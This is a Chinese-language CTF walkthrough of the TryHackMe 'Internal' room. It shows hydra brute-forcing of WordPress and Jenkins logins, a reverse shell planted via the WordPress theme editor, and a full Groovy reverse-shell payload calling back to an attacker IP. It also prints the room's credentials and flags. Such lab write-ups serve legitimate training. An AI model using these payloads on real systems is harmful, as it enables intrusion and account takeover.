# Internal

工作范围

客户要求工程师对提供的虚拟环境进行外部、Web 应用程序和内部评估。客户要求提供有关评估的最少信息，希望从恶意行为者的眼睛进行参与（黑盒渗透测试）。客户端要求您保护两个标志（未提供位置）作为利用证明：

user.txt

root.txt

此外，客户还提供了以下范围津贴：

确保修改主机文件以反映内部文件.thm
此参与中允许使用任何工具或技术
找到并记下发现的所有漏洞
将发现的标志提交到仪表板
只有分配给计算机的 IP 地址在范围内
（角色扮演关闭）

我鼓励您将此挑战作为实际的渗透测试。考虑撰写一份报告，包括执行摘要、漏洞和利用评估以及补救建议，因为这将有利于您准备 eLearnsecurity eCPPT 或作为该领域的渗透测试人员的职业。



注意 - 这个房间可以在没有Metasploit的情况下完成

---

循例 nmap 扫，开了80和22

进web看看，apache默认页面，再用gobuster扫一波目录：

<pre>/blog                <font color="#49AEE6"> (Status: 301)</font> [Size: 313]<font color="#367BF0"> [--&gt; http://10.10.193.174/blog/]</font>
/index.html          <font color="#5EBDAB"> (Status: 200)</font> [Size: 10918]
/javascript          <font color="#49AEE6"> (Status: 301)</font> [Size: 319]<font color="#367BF0"> [--&gt; http://10.10.193.174/javascript/]</font>
/phpmyadmin          <font color="#49AEE6"> (Status: 301)</font> [Size: 319]<font color="#367BF0"> [--&gt; http://10.10.193.174/phpmyadmin/]</font>
/server-status       <font color="#FEA44C"> (Status: 403)</font> [Size: 278]
/wordpress           <font color="#49AEE6"> (Status: 301)</font> [Size: 318]<font color="#367BF0"> [--&gt; http://10.10.193.174/wordpress/]</font>
</pre>

进/blog页面查看到许多域名

    internal.thm

将该域名添加进/etc/hosts

收集到了一些版本信息，但是似乎都没有相关的cve

在/blog下发现了/wp-login.php，是一个wp的登录页面，尝试弱口令，失败

但是，回显信息：

    The password you entered for the username admin is incorrect.

没错，因此我们得知了admin这个账号是存在的，那么我们尝试爆破它

burp用腻了，换种工具玩玩，没错，它就是我们熟悉的hydra

<pre><font color="#367BF0">┌──(</font><font color="#EC0101"><b>root💀kali</b></font><font color="#367BF0">)-[</font><b>/home/sugobet</b><font color="#367BF0">]</font>
<font color="#367BF0">└─</font><font color="#EC0101"><b>#</b></font> <font color="#5EBDAB">hydra</font> <font color="#9755B3">-l</font> admin <font color="#9755B3">-P</font> <u style="text-decoration-style:single">/usr/share/wordlists/rockyou.txt</u> 10.10.193.174 http-post-form <font color="#FEA44C">&apos;/blog/wp-login.php:log=admin&amp;log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2Finternal.thm%2Fblog%2Fwp-admin%2F&amp;testcookie=1:Error&apos;</font></pre>

刷了会抖音，爆出来了

<pre>[<font color="#47D4B9"><b>80</b></font>][<font color="#47D4B9"><b>http-post-form</b></font>] host: <font color="#47D4B9"><b>10.10.193.174</b></font>   login: <font color="#47D4B9"><b>admin</b></font>   password: <font color="#47D4B9"><b>my2boys</b></font></pre>

后台中的添加页面处存在图片上传点，但是似乎有白名单，尝试绕过了半天，都失败了。

之前做过几道cms的题，但是他们都是通过修改网站模板的php页面源代码以实现reverse shell的

所以我尝试找找看wordpress有没有类似的地方

确实存在，在后台的：

    Appearance -> Theme Editor

随便找个页面将其修改成reverse shell可用的payload

我们选择修改index.php

然后nc开启监听，然后访问/blog/index.php

成功getshell

<pre>Ncat: Connection from 10.10.193.174.
Ncat: Connection from 10.10.193.174:54124.
bash: cannot set terminal process group (1096): Inappropriate ioctl for device
bash: no job control in this shell
www-data@internal:/var/www/html/wordpress$ whoami
whoami
www-data
</pre>

稍微升级shell

    python3 -c "import pty;pty.spawn('/bin/bash')"

通过uname -a和cat /proc/version，我们得知其内核版本和ubuntu版本，手上捏着好几个适用的CVE，我尽量克制一下，先不用

---

当前的目录下存在wp-config.php，里面包含了数据库的账户和密码，但是数据库也没啥有用的东西

经过一番搜寻，在/opt下有一个wp-save.txt：

    Bill,

    Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

    aubreanna:bubb13guM!@#123

<pre><font color="#367BF0">┌──(</font><font color="#EC0101"><b>root💀kali</b></font><font color="#367BF0">)-[</font><b>/home/sugobet</b><font color="#367BF0">]</font>
<font color="#367BF0">└─</font><font color="#EC0101"><b>#</b></font> <font color="#5EBDAB">ssh</font> aubreanna@10.10.193.174</pre>

成功登入

<pre><font color="#47D4B9"><b>aubreanna@internal</b></font>:<font color="#277FFF"><b>~</b></font>$ cat ./user.txt
THM{int3rna1_fl4g_1}</pre>

并发现：

<pre><font color="#47D4B9"><b>aubreanna@internal</b></font>:<font color="#277FFF"><b>~</b></font>$ cat ./jenkins.txt 
Internal Jenkins service is running on 172.17.0.2:8080</pre>

使用ss -tlpn确定该服务正在运行于内网中

使用ssh转发流量到目标8080端口：

    ssh aubreanna@10.10.193.174 -L 8888:172.17.0.2:8080

然后在攻击机上使用浏览器打开：

    http://127.0.0.1:8888/


熟悉的登录页面，因为前几道题里面做过关于Jenkins的

弱口令失败，尝试爆破admin

<pre><font color="#367BF0">┌──(</font><font color="#EC0101"><b>root💀kali</b></font><font color="#367BF0">)-[</font><b>/home/sugobet</b><font color="#367BF0">]</font>
<font color="#367BF0">└─</font><font color="#EC0101"><b>#</b></font> <font color="#5EBDAB">hydra</font> <font color="#9755B3">-l</font> admin <font color="#9755B3">-P</font> <u style="text-decoration-style:single">/usr/share/wordlists/rockyou.txt</u> 127.0.0.1 <font color="#9755B3">-s</font> 8888 http-post-form <font color="#FEA44C">&apos;/j_acegi_security_check:j_username=admin&amp;j_password=^PASS^&amp;from=%2F&amp;Submit=Sign+in:Invalid&apos;</font></pre>

<pre>[<font color="#47D4B9"><b>8888</b></font>][<font color="#47D4B9"><b>http-post-form</b></font>] host: <font color="#47D4B9"><b>127.0.0.1</b></font>   login: <font color="#47D4B9"><b>admin</b></font>   password: <font color="#47D4B9"><b>spongebob</b></font></pre>

很好，我们是对的

按照经验，我们在后台的：

    Manage Jenkins -> script console

这里能够执行java代码：

    "whoami".execute().text

成功，现在尝试reverse shell

Groovy payload:

    String host="10.11.17.14";
    int port=8889;
    String cmd="/bin/bash";
    Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

成功getshell

<pre>ls -la /opt
total 12
drwxr-xr-x 1 root root 4096 Aug  3  2020 .
drwxr-xr-x 1 root root 4096 Aug  3  2020 ..
-rw-r--r-- 1 root root  204 Aug  3  2020 note.txt
cat /opt/note.txt
Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
need access to the root user account.

root:tr0ub13guM!@#123
</pre>

<pre><font color="#47D4B9"><b>aubreanna@internal</b></font>:<font color="#277FFF"><b>~</b></font>$ su root
Password: 
root@internal:/home/aubreanna# cat /root/root.txt
THM{d0ck3r_d3str0y3r}
</pre>

这出题人，这就没意思了，直接给root密码，好歹也出些PE的点
